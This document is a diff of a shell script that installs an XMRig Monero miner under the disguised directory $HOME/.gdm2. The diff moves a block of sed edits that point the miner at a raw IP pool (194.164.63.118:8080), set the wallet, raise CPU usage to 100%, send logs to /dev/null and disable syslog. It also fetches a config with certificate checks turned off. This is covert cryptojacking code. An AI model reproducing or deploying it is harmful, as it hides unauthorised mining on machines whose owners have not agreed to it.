@@ -249,19 +249,6 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "194.164.63.118:8080",/' $HOME/.gdm2/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
-sed -i 's#"log-file": *null,#"log-file": "'/dev/null'",#' $HOME/.gdm2/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm2/config.json
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
-sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.gdm2/config.json
-
-
-cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
-
 
 # preparing script
 
@@ -351,6 +338,19 @@ echo ""
 rm -rf $HOME/.gdm2/config.json
 wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm2/config.json
 curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.gdm2/config.json
+
+sed -i 's/"url": *"[^"]*",/"url": "194.164.63.118:8080",/' $HOME/.gdm2/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
+sed -i 's#"log-file": *null,#"log-file": "'/dev/null'",#' $HOME/.gdm2/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm2/config.json
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
+sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.gdm2/config.json
+
+
+cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
 
 rm -rf xmrig.tar*
 
